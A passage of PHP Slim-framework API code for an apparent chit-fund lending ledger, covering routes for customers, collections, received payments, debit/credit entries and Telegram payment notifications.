			$received["customer"] = $asalu[$i]["customer"];
			$received["amount"] = $asalu[$i]["amount"];
			$received["rcvddate"] = $asalu[$i]["date"];
			$received["asalu"] = 1;
			$received["asaluid"] = $createDailyasaluStatus["id"];
			$received["chiti"] = $asalu[$i]["chiti"];
			$received["collectedby"] = $asalu[$i]["collectedby"];
			$colid = 0;
			$received["paymentmode"] = $asalu[$i]["paymentmode"];
			$received["pmid"] = "";
			$received["note"] = $asalu[$i]["note"];

			$createreceivedstatus = $db->createreceived($colid, $received);
			// echo "rcvdstatus".json_encode($createreceivedstatus);

			if ($createreceivedstatus["status"] == SUCCESS) {

				if ($received["paymentmode"] == "50" && sizeof($asalu[$i]["pmtrans"]) > 0) {
					$pmid = array();
					for ($k = 0; $k < sizeof($asalu[$i]["pmtrans"]); $k++) {
						if ($asalu[$i]["pmtrans"][$k]["paymentmode"]) {
							$pmtrans = array();
							$pmtrans["date"] = $received["rcvddate"];
							$pmtrans["tablename"] = "received";
							$pmtrans["tableid"] = $createreceivedstatus['id'];
							$pmtrans["paymentmode"] = $asalu[$i]["pmtrans"][$k]["paymentmode"];
							$pmtrans["credit"] = $asalu[$i]["pmtrans"][$k]["credit"];
							$pmtrans["debit"] = 0;
							$createpmtransstatus = $db->createPmTrans($pmtrans);
							$msg .= "[" . getpmname($pmtrans["paymentmode"], $paymentmodeList) . ":" . $pmtrans["credit"] . "]";
							array_push($pmid, $createpmtransstatus['id']);
							// echo "pmtrans_status".json_encode($createreceivedstatus);
						}
					}

					if ($pmid && sizeof($pmid) > 0) {
						$params = $db->putFunctionParam("received");
						$updateField = array();
						$updateField["id"] = $createreceivedstatus['id'];
						$putdata = array();
						array_push($putdata, $updateField);
						for ($q = 0; $q < sizeof($params); $q++) {
							if ($params[$q] == "pmid") {
								array_push($putdata, implode(',', $pmid));
							} else {
								array_push($putdata, "");
							}
						}
						array_push($putdata, "");
						$editDetail = call_user_func_array(array($db, 'editreceived'), $putdata);
					}
				} else {
					$msg .= "(" . $asalu[$i]["paymentmodename"] . ")";
				}
			}
		}

	}
	// 	$asaluData = $tmp;
	$asaluids = rtrim(implode(',', $asaluid), ',');
	// echo $msg;
	if($asalu[0]["chiti"] == 696){
	    $teleStatus = sendTelegram(urlencode($msg), "sanju");	    
	}else{
		$teleStatus = sendTelegram(urlencode($msg), "main");
	}
	// echo json_encode($teleStatus);

	$response["error"] = false;
	$response["status"] = "success";
	$response["id"] = $asaluids;
	$response["message"] = "Woot!,Successfully created asalu entries for id " . $asaluids;

	echoRespnse(200, $response);
});


$app->post('/entry', function () use ($app) {
	$q = json_decode($app->request->getBody());
	verifyRequiredParams(array());
	$entry = array();
	$chiti["nAme"] = postParams($app->request->post("nAme"));
	$chiti["dAte"] = postParams($app->request->post("dAte"));
	$chiti["tYpe"] = postParams($app->request->post("tYpe"));
	$chiti["aMount"] = postParams($app->request->post("aMount"));
	$chiti["pdwtm"] = postParams($app->request->post("pdwtm"));
	$chiti["interestrate"] = postParams($app->request->post("interestrate"));
	$chiti["sowji"] = postParams($app->request->post("sowji"));
	$db = new DbHandler();

	$createchitistatus = $db->createchiti($chiti);
	if ($createchitistatus['status'] == FAILED) { //if error occurs while creating product
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while creating Chiti";
		$response["err"] = $createchitistatus;
	} else {

		$response["error"] = false;
		$response["status"] = "success";
		$response["id"] = $createchitistatus['id'];
		$response["message"] = "Woot!,Successfully created Chiti with id " . $createchitistatus['id'];
	}

	echoRespnse(200, $response);

});



$app->get('/customers', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("customers");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}
	$customerList = call_user_func_array(array($db, 'getcustomers'), $getdata);
	$outputfields = array("id", "id", "firstname", "lastname","fullname", "phoneno", "hami", "ishami", "chitfund", "hamifirstname", "hamilastname", "hamiphoneno", "aadhar", "passbook", "debitcard", "cheque", "pnote", "greensheet", "note", "forint", "intrate", "created", "updated");
	$qryfields = array("id", "SNO", "Firstname", "LastName","fullname","PhoneNo", "hami", "ishami", "chitfund", "HamiFirstName", "HamiLastName", "HamiPhoneNo", "aadhar", "passbook", "debitcard", "cheque", "pnote", "greensheet", "note", "forint", "intrate", "Created", "Updated");
	$customer = array();
	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($customerList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($customerList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $customerList[$i][$outputfields[$j]];
			}
		}
		array_push($customer, $tmp);

	}

	$response["error"] = false;
	$getdata[sizeof($getdata) - 3] = "";
	$getdata[sizeof($getdata) - 2] = "";
	$getdata[sizeof($getdata) - 1] = 1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcustomers'), $getdata)[0]["count(*)"];

	$response["customers"] = $customer;
	$response["message"] = "Woot!,Successfully retreived the customer list";


	echoRespnse(200, $response);

});

$app->get('/customer/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("customers");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$customerList = call_user_func_array(array($db, 'getcustomers'), $getdata);
	$outputfields = array("id", "firstname", "lastname","fullname", "phoneno", "hami", "ishami", "chitfund", "hamifirstname", "hamilastname", "hamiphoneno", "hami", "aadhar", "passbook", "debitcard", "cheque", "pnote", "greensheet", "note", "forint", "intrate", "created", "updated"); //db
	$qryfields = array("id", "firstName", "lastName","fullname","phoneNo", "hami", "ishami", "chitfund", "hamiFirstName", "hamiLastName", "hamiPhoneNo", "hami", "aadhar", "passbook", "debitcard", "cheque", "pnote", "greensheet", "note", "forint", "intrate", "Created", "Updated");
	$customer = array();
	// looping through result and preparing tasks array
	$tmp = array();
	for ($i = 0; $i < sizeOf($customerList); $i++) {

		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($customerList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $customerList[$i][$outputfields[$j]];
			}
		}
		//echo json_encode($tmp);
		//	array_push($customer,$tmp);

	}

	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcustomers'), $getdata)[0]["count(*)"];
	$response["customer"] = $tmp;
	$response["message"] = "Woot!,Successfully retreived the customer list";


	echoRespnse(200, $response);

});




// $app->get('/placc',function() use($app){
// 	$response = array();
// 	$db = new DbHandler();

// 	$params= $db->getFunctionParam("customers");
// 	$getdata = array();
// 	for($i=0;$i<sizeof($params);$i++){
// 			if(getParams($app->request->get($params[$i]))){
// 				array_push($getdata,getParams($app->request->get($params[$i])));
// 			}else{
// 				array_push($getdata,"");
// 			}
// 	}
// 	$customerList = call_user_func_array(array($db,'getcustomers'), $getdata);	

// 	if($customerList && sizeof($customerList)>0){
// 		// $intcustomersList = 
// 		for($i=0;$i<sizeof($customerList);$i++){
// 			if($customers[$i]["forint"] == 1){

// 			}
// 				//first get int customers asalu balance
// 				$params= $db->getFunctionParam("drcr");
// 				$getdata = array();
// 				for($i=0;$i<sizeof($params);$i++){
// 						if($params[$i]=="forint"){
// 							array_push($getdata,1);
// 						}else if($params[$a] == "fields"){
// 							array_push($getdata,"sum(credit) as credittotal,sum(debit) as debittotal");
// 						}else{
// 							array_push($getdata,"");
// 						}
// 				}
// 				$drcrList = call_user_func_array(array($db,'getdrcr'), $getdata);	
// 			}
// 		// }
// 	}

// 		$response["error"] = false;
// 		$getdata[sizeof($getdata)-3]="";
// 		$getdata[sizeof($getdata)-2]="";
// 		$getdata[sizeof($getdata)-1]=1;
// 		$response['status'] = "success";
// 		//$response['total'] = call_user_func_array(array($db,'getcustomers'), $getdata)[0]["count(*)"];

// 		$response["customers"] =$customer;
// 		$response["message"] = "Woot!,Successfully retreived the customer list";


// 	echoRespnse(200, $response);	

// });



$app->get('/asalu', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("asalu");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}
	$asaluList = call_user_func_array(array($db, 'getasalu'), $getdata);
	$outputfields = array("id", "date", "customer", "amount", "chitiamount", "chiti", "code", "customername", "note", "paymentmode", "paymentmodename", "pmid", "rcvdid", "rcvdnote", "created", "updated");
	$qryfields = array("id", "date", "customer", "amount", "chitiamount", "chiti", "code", "customername", "note", "paymentmode", "paymentmodename", "pmid", "rcvdid", "rcvdnote", "created", "updated");
	$asalu = array();
	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($asaluList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($asaluList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $asaluList[$i][$outputfields[$j]];
			}
		}
		// echo json_encode($tmp);
		$tmp["pmtrans"] = array();
		if (array_key_exists("paymentmode", $tmp) && $tmp["paymentmode"] == 50) {
			$getpmdata = array();
			$params = $db->getFunctionParam("pmtrans");
			for ($m = 0; $m < sizeof($params); $m++) {
				if ($params[$m] == "id") {
					$temp = array();
					$temp["op"] = "In";
					$temp["value"] = $tmp["pmid"];
					array_push($getpmdata, json_encode($temp));
					// }else if($params[$m] == "tablename"){
					// 	array_push($getpmdata,"received");
				} else {
					array_push($getpmdata, "");
				}
			}
			// echo json_encode($getpmdata);
			$tmp["pmtrans"] = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
			// echo json_encode($tmp["pmtrans"]);
		}

		array_push($asalu, $tmp);


	}

	$response["error"] = false;
	$getdata[sizeof($getdata) - 3] = "";
	$getdata[sizeof($getdata) - 2] = "";
	$getdata[sizeof($getdata) - 1] = 1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcustomers'), $getdata)[0]["count(*)"];

	$response["asalu"] = $asalu;
	$response["message"] = "Woot!,Successfully retreived the asalu list";


	echoRespnse(200, $response);

});


$app->put('/customer/:id', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());

	$db = new DbHandler();
	$bankEntry = array();
	$params = $db->getFunctionParam("customers");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$customerDetail = call_user_func_array(array($db, 'getcustomers'), $getdata);
	if (sizeOf($customerDetail) > 0) {
		$params = $db->putFunctionParam("customers");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i]) || (putParam($r, $params[$i]) == "0")) {
				array_push($putdata, putParam($r, $params[$i]));
			} else {
				array_push($putdata, "");
			}
		}
				// }else if( $Customer["Hami"]==0 && $Customer["IsHami"]==1){
				// 	// echo "worked";
				// 	if($params[$i]== "hami"){
				// 		array_push($putdata,$id);
				// 	}else{
				// 		array_push($putdata,"");
				// 	}
		/*else if($Customer["IsHami"]==0 && $Customer["Hami"]==$id) {
		if($params[$i]== "hami"){
		array_push($putdata,"");
		}
		}*/
		array_push($putdata, "");


		$editDetail = call_user_func_array(array($db, 'editcustomer'), $putdata);

		if ($editDetail) { //if error occurs while creating product

			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully edited party information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while editing party information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No party found with given ID";
	}
	echoRespnse(200, $response);
});


$app->get('/collection/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("collection");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$collectionList = call_user_func_array(array($db, 'getcollection'), $getdata);
	$outputfields = array("id", "chiti", "code", "tYpe", "status", "chitiamount", "chitidate", "date", "amount", "notes", "sowji", "sowjitotal", "suri", "fullandevi", "iscountable", "received", "reverseid", "receivedfrom", "customer", "customerFL", "hami", "haminame", "rcvddate", "created", "updated", "fields", "sort_by", "sort_order", "group_by", "limit", "offset", "totalcount");
	$qryfields = array("id", "chiti", "code", "tYpe", "status", "chitiamount", "chitidate", "date", "amount", "notes", "sowji", "sowjitotal", "suri", "fullandevi", "iscountable", "received", "reverseid", "receivedfrom", "customer", "customerFL", "hami", "haminame", "rcvddate", "created", "updated", "fields", "sort_by", "sort_order", "group_by", "limit", "offset", "totalcount");
	$collection = array();
	// looping through result and preparing tasks array
	$tmp = array();
	for ($i = 0; $i < sizeOf($collectionList); $i++) {

		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($collectionList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $collectionList[$i][$outputfields[$j]];
			}
		}

		// $tmp["pmtrans"] = array();
		// if($tmp["paymentmode"] == 50 && $tmp["pmid"]){
		// 	$getpmdata = array();
		// 	$params = $db->getFunctionParam("pmtrans");
		// 	for($m=0;$m<sizeof($params);$m++){
		// 		if($params[$m] == "id"){
		// 			$temp = array();
		// 			$temp["op"] = "In";
		// 			$temp["value"] = $tmp["pmid"];
		// 			array_push($getpmdata,json_encode($temp));
		// 		}else{
		// 			array_push($getpmdata,"");
		// 		}
		// 	}
		// 	$tmp["pmtrans"] = call_user_func_array(array($db,'getPmTrans'),$getpmdata);
		// }
		//	array_push($customer,$tmp);

	}


	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcustomers'), $getdata)[0]["count(*)"];
	$response["collection"] = $tmp;
	$response["message"] = "Woot!,Successfully retreived the collection list";


	echoRespnse(200, $response);

});


$app->put('/collection/:id', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	//echo json_encode($r);
	$params = $db->getFunctionParam("collection");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$oldCollectionDetail = call_user_func_array(array($db, 'getcollection'), $getdata);


	if (sizeOf($oldCollectionDetail) > 0) {
		$params = $db->putFunctionParam("collection");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i]) || (putParam($r, $params[$i])) == "0") {
				array_push($putdata, putParam($r, $params[$i]));
			} else {
				array_push($putdata, "");
			}
		}
		array_push($putdata, "");

		$editDetail = call_user_func_array(array($db, 'editcollection'), $putdata);

		if ($editDetail) {
			if (sizeOf($oldCollectionDetail) > 0) {
				if ($oldCollectionDetail[0]["received"] != putParam($r, "received")) {

				}
			}

			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully edited collection information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while editing collection  information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No collection found with given ID";
	}
	echoRespnse(200, $response);
});



$app->delete('/collection/:id', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	//echo json_encode($r);
	$params = $db->getFunctionParam("collection");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$oldCollectionDetail = call_user_func_array(array($db, 'getcollection'), $getdata);


	if (sizeOf($oldCollectionDetail) > 0) {
		$params = $db->putFunctionParam("collection");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			array_push($putdata, "");
		}
		array_push($putdata, "1");

		$editDetail = call_user_func_array(array($db, 'editcollection'), $putdata);

		if ($editDetail) {
			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully Deleted collection information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while Deleting collection  information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No collection found with given ID";
	}
	echoRespnse(200, $response);
});


$app->post('/receivedcollection', function () use ($app) {

	$r = json_decode($app->request->getBody());

	$db = new DbHandler();
	// $collectionarr = postParams($app->request->post('collectionarr'));
	// $rcvddate = postParams($app->request->post('rcvddate'));
	// $notes = postParams($app->request->post('notes'));
	// $receivedfrom = postParams($app->request->post('receivedfrom'));
	// $collectionsowji = postParams($app->request->post('collectionsowji'));

	$received["rcvddate"] = postParams($app->request->post('rcvddate'));
	$received["userrcvddate"] = postParams($app->request->post('userrcvddate'));
	$received["customer"] = postParams($app->request->post('customer'));
	$received["customername"] = postParams($app->request->post('customername'));
	$received["chiti"] = postParams($app->request->post('chiti'));
	$received["collectionarr"] = postParams($app->request->post('collectionarr'));
	$received["collectedby"] = postParams($app->request->post('collectedby'));
	$received["paymentmode"] = postParams($app->request->post('paymentmode'));
	$received["pmtrans"] = postParams($app->request->post('pmtrans'));
	$received["note"] = postParams($app->request->post('note'));
	$received["note1"] = postParams($app->request->post('note1'));
	$received["asalu"] = 0;
	$received["asaluid"] = 0;
	$rcvdpmmode = false;
	$mainmsg = $received["userrcvddate"] . " : " . $received["customername"] . "(" . $received["chiti"] . ") gave ";
	// 27/2/23 : durga(573)
	if (gettype($received["collectionarr"]) == "string") {
		$received["collectionarr"] = json_decode($received["collectionarr"]);
		$received["collectionarr"][0] = json_decode(json_encode($received["collectionarr"][0]), True);
		//echo "type ->".gettype($received["collectionarr"])."data->".json_encode($received["collectionarr"]);
		$received["pmtrans"] = [];
	}
	if ($received["collectionarr"]) {
		if ($received["paymentmode"]) {
			$rcvdpmmode = true;
		}
		$rcvdttl = 0;
		$arrSize = sizeof($received["collectionarr"]);
		$intdates = "";
		for ($i = 0; $i < sizeof($received["collectionarr"]); $i++) {
			$rcvdttl += $received["collectionarr"][$i]["colamt"];
			$updatenotes = 0;
			$getcoldata = array();
			$paramms = $db->getFunctionParam("collection");
			for ($m = 0; $m < sizeof($paramms); $m++) {
				if ($paramms[$m] == "id") {
					array_push($getcoldata, $received["collectionarr"][$i]["colid"]);
				} else {
					array_push($getcoldata, "");
				}
			}

			$collDetail = call_user_func_array(array($db, 'getcollection'), $getcoldata);
			if (sizeof($collDetail)) {
				if ($arrSize == 1) {
					$intdates = changeDateUserFormat($collDetail[0]["date"]);
				} else if ($arrSize == 2) {
					if (!$m) {
						$intdates = changeDateUserFormat($collDetail[0]["date"]);
					} else {
						$intdates .= "," . changeDateUserFormat($collDetail[0]["date"]);
					}
				} else if ($arrSize > 2) {
					if (!$m) {
						$intdates = changeDateUserFormat($collDetail[0]["date"]);
					} else if ($m == ($arrSize - 1)) {
						$intdates .= "-" . changeDateUserFormat($collDetail[0]["date"]);
					}
				}

			}

			if ($received["note1"]) {
				$updatenotes = 2;
			}

			if (sizeof($collDetail) > 0) {
				if ($collDetail[0]["notes"]) {
					$updatenotes = 1;
				}

				$getrcvddata = array();
				$paramss = $db->getFunctionParam("receivedamount");
				for ($m = 0; $m < sizeof($paramss); $m++) {
					if ($paramss[$m] == "colid") {
						array_push($getrcvddata, $received["collectionarr"][$i]["colid"]);
					} else {
						array_push($getrcvddata, "");
					}
				}

				$receivedDetail = call_user_func_array(array($db, 'getreceivedamount'), $getrcvddata);
				// echo "receivedDetail--".json_encode($receivedDetail);
				$amt = 0;
				if (sizeof($receivedDetail) > 0) {
					for ($u = 0; $u < sizeof($receivedDetail); $u++) {
						$amt += $receivedDetail[$u]["amount"];
					}
				}

				$amt += $received["collectionarr"][$i]["colamt"];

				if ($amt == $collDetail[0]["amount"]) {
					$params = $db->putFunctionParam("collection");
					$updateField = array();
					$updateField["id"] = $received["collectionarr"][$i]["colid"];
					$putdata = array();
					array_push($putdata, $updateField);
					for ($j = 0; $j < sizeof($params); $j++) {
						if ($params[$j] == "received") {
							array_push($putdata, 1);
						} else if ($params[$j] == "rcvddate") {
							array_push($putdata, $received["rcvddate"]);
						} else if ($params[$j] == "receivedfrom") {
							array_push($putdata, $received["customer"]);
						} else if ($params[$j] == "notes") {
							if ($updatenotes == 1) {
								$note2 = $collDetail[0]["notes"] . " + " . $received["collectionarr"][$i]["colamt"] . "(" . $received["userrcvddate"] . ")";
								array_push($putdata, $note2);
							} else if ($updatenotes == 2) {
								array_push($putdata, $received["note1"]);
							} else if ($updatenotes == 0) {
								array_push($putdata, "");
							}
						} else {
							array_push($putdata, "");
						}
					}
					array_push($putdata, "");

					$editDetail = call_user_func_array(array($db, 'editcollection'), $putdata);
					// echo "editDetail--".json_encode($editDetail);

				} else if ($amt > $collDetail[0]["amount"]) {
					$response["error"] = true;
					$response["status"] = "error";
					$response["message"] = "Rcvd Amount Exceeded the Collection Amount ,ID:" . $received["collectionarr"][$i]["colid"];
					echoRespnse(200, $response);
					return;
				} else if ($amt < $collDetail[0]["amount"]) {
					$params = $db->putFunctionParam("collection");
					$updateField = array();
					$updateField["id"] = $received["collectionarr"][$i]["colid"];
					$putdata = array();
					array_push($putdata, $updateField);
					for ($j = 0; $j < sizeof($params); $j++) {
						if ($params[$j] == "notes") {
							if ($updatenotes == 1) {
								$note2 = $collDetail[0]["notes"] . " + " . $received["collectionarr"][$i]["colamt"] . "(" . $received["userrcvddate"] . ")";
								array_push($putdata, $note2);
							} else if ($updatenotes == 2) {
								array_push($putdata, $collDetail[0]["notes"]);
							} else if ($updatenotes == 0) {
								$note3 = $received["collectionarr"][$i]["colamt"] . "(" . $received["userrcvddate"] . ")";
								array_push($putdata, $note3);
							}
						} else {
							array_push($putdata, "");
						}
					}
					array_push($putdata, "");

					$editDetail = call_user_func_array(array($db, 'editcollection'), $putdata);
					// echo "editDetail11--".json_encode($editDetail);

				}


				//start
				$received["amount"] = $received["collectionarr"][$i]["colamt"];
				// echo isset($received["paymentmode"])."dkjdkl;";
				if ((!$rcvdpmmode)) {
					$received["paymentmode"] = $received["collectionarr"][$i]["paymentmode"];
				}
				$received["pmid"] = "";


				// echo "start ->".$i." : ".json_encode($received["collectionarr"][$i]["colid"]);
				$createreceivedstatus = $db->createreceived($received["collectionarr"][$i]["colid"], $received);
				// echo "createreceivedstatus--".json_encode($createreceivedstatus);
				if ($createreceivedstatus['status'] == FAILED) { //if error occurs while creating product
					$response["error"] = true;
					$response["status"] = "error";
					$response["message"] = "Oops! An error occurred while creating received of Coll ID:" . $received["collectionarr"][$i]["colid"];
					$response["err"] = $createreceivedstatus;
					return;
				} else {
					if ($received["collectionarr"][$i]["paymentmode"] == "50" && sizeof($received["collectionarr"][$i]["pmtrans"]) > 0) {
						$pmid = array();
						for ($k = 0; $k < sizeof($received["collectionarr"][$i]["pmtrans"]); $k++) {
							if ($received["collectionarr"][$i]["pmtrans"][$k]["paymentmode"]) {
								$pmtrans = array();
								$pmtrans["date"] = $received["rcvddate"];
								$pmtrans["tablename"] = "received";
								$pmtrans["tableid"] = $createreceivedstatus['id'];
								$pmtrans["paymentmode"] = $received["collectionarr"][$i]["pmtrans"][$k]["paymentmode"];
								$pmtrans["credit"] = $received["collectionarr"][$i]["pmtrans"][$k]["credit"];
								$pmtrans["debit"] = 0;

								$createpmtransstatus = $db->createPmTrans($pmtrans);
								array_push($pmid, $createpmtransstatus['id']);

							}
						}


						if ($pmid && sizeof($pmid) > 0) {
							$params = $db->putFunctionParam("received");
							$updateField = array();
							$updateField["id"] = $createreceivedstatus['id'];
							$putdata = array();
							array_push($putdata, $updateField);
							for ($q = 0; $q < sizeof($params); $q++) {
								if ($params[$q] == "pmid") {
									array_push($putdata, implode(',', $pmid));
								} else {
									array_push($putdata, "");
								}
							}
							array_push($putdata, "");
							$editDetail = call_user_func_array(array($db, 'editreceived'), $putdata);
						}
						// }
					}
					$response["error"] = false;
					$response["status"] = "success";
					$response["id"] = $createreceivedstatus['id'];
					$response["message"] = "Woot!,Successfully created Received Entries with id " . $createreceivedstatus['id'];
				}

				//end

			} else {
				$response["error"] = true;
				$response["status"] = "error";
				$response["message"] = "No Collection Entry found with given ID";
				echoRespnse(200, $response);
				return;
			}
		}

		$mainmsg .= $rcvdttl . "(" . $intdates . ")";
		// $teleStatus = sendTelegram(urlencode($fullmsg),"full");
		$teleStatus = sendTelegram(urlencode($mainmsg), "main");
		if($received["chiti"] == 696){
	        $teleStatus = sendTelegram(urlencode($mainmsg), "sanju");
		}
	}
	// $db->updatesowji($collectionsowji);
	$response = array();
	$response["error"] = false;
	$response["status"] = "success";
	$response["message"] = "Woot!,Successfully created rcvd collection information";
	echoRespnse(200, $response);



});



//start drcr

$app->post('/drcr', function () use ($app) {
	verifyRequiredParams(array('date', 'paymentmode', 'customer'));
	$r = json_decode($app->request->getBody());
	$received = array();
	$received["date"] = postParams($app->request->post('date'));
	$received["customer"] = postParams($app->request->post('customer'));
	$received["credit"] = postParams($app->request->post('credit'));
	$received["debit"] = postParams($app->request->post('debit'));
	$received["showdaybook"] = postParams($app->request->post('showdaybook'));
	$received["note"] = postParams($app->request->post('note'));
	$received["note1"] = postParams($app->request->post('note1'));
	$received["forint"] = postParams($app->request->post('forint'));
	$received["collectedby"] = postParams($app->request->post('collectedby'));
	$received["paymentmode"] = postParams($app->request->post('paymentmode'));
	$received["pmid"] = postParams($app->request->post('pmid'));
	$received["pmtrans"] = postParams($app->request->post('pmtrans'));
	$received["creditexp"] = postParams($app->request->post('creditexp'));
	$received["crid"] = postParams($app->request->post('crid'));
	$received["chitfundid"] = postParams($app->request->post('chitfundid'));
	$collectionsowji = postParams($app->request->post('collectionsowji'));
	$intid = postParams($app->request->post('intid'));
	$intcr = postParams($app->request->post('intcr'));
	$intdate = postParams($app->request->post('intdate'));

	if($received['debit'] > 0){
		$received["collectedby"] = 0;
	}
	
	$db = new DbHandler();
	if ($intid) {
		for ($i = 0; $i < sizeof($intid); $i++) {
			$updateField = array();
			$updateField["date"] = $intdate;
			$updateField["customer"] = $intid[$i];
			$updateField["credit"] = $intcr[$i];
			$updateField["debit"] = "0";
			$updateField["crid"] = "0";
			$updateField["forint"] = "1";
			$updateField["note"] = "interestcal";
			$updateField["note1"] = ".";
			$updateField["creditexp"] = "0";
			$updateField["showdaybook"] = "2";
			$updateField["chitfundid"] = "0";

			$putdata = array();
			$createreceivedstatus = $db->createdrcr($updateField);
		}

	}

	if ($received["customer"]) {
		$createreceivedstatus = $db->createdrcr($received);
	}

	if ($createreceivedstatus["status"] == FAILED) {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! an error occured while creating drcr entry";
	} else {
		// echo $received["paymentmode"];
		if ($received["paymentmode"] == "50"){
		    if (gettype($received["pmtrans"]) == "string") {
                $received["pmtrans"] = json_decode($received["pmtrans"], true);
	        }
    		 if(sizeof($received["pmtrans"]) > 0) {
    			$pmid = array();
    			for ($k = 0; $k < sizeof($received["pmtrans"]); $k++) {
    				if ($received["pmtrans"][$k]["paymentmode"]) {
    					$pmtrans = array();
    					$pmtrans["date"] = $received["date"];
    					$pmtrans["tablename"] = "drcr";
    					$pmtrans["tableid"] = $createreceivedstatus['id'];
    					$pmtrans["paymentmode"] = $received["pmtrans"][$k]["paymentmode"];
    					$pmtrans["credit"] = $received["pmtrans"][$k]["credit"];
    					$pmtrans["debit"] = $received["pmtrans"][$k]["debit"];
    					$createpmtransstatus = $db->createPmTrans($pmtrans);
    					array_push($pmid, $createpmtransstatus['id']);
    				}
    			}
    
    			if ($pmid && sizeof($pmid) > 0) {
    				$params = $db->putFunctionParam("drcr");
    				$updateField = array();
    				$updateField["id"] = $createreceivedstatus['id'];
    				$putdata = array();
    				array_push($putdata, $updateField);
    				for ($i = 0; $i < sizeof($params); $i++) {
    					if ($params[$i] == "pmid") {
    						array_push($putdata, implode(',', $pmid));
    					} else {
    						array_push($putdata, "");
    					}
    				}
    				array_push($putdata, "");
    				// echo " 3- ".json_encode($putdata);
    				$editDetail = call_user_func_array(array($db, 'editdrcr'), $putdata);
    
    			}
    
    		}
		}
		// $db->updatesowji($collectionsowji);
		$response["error"] = false;
		$response["status"] = "success";
		$response["id"] = $createreceivedstatus['id'];
		$response["message"] = "Woot! successfully created DrCr entry with id" . $createreceivedstatus['id'];
	}
	echoRespnse(200, $response);

});

$app->get('/drcr', function () use ($app) {
	$response = array();
	$db = new DbHandler();
	$params = $db->getFunctionParam("drcr");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}

	}

	$drcrList = call_user_func_array(array($db, 'getdrcr'), $getdata);
	if (sizeof($drcrList) > 0) {
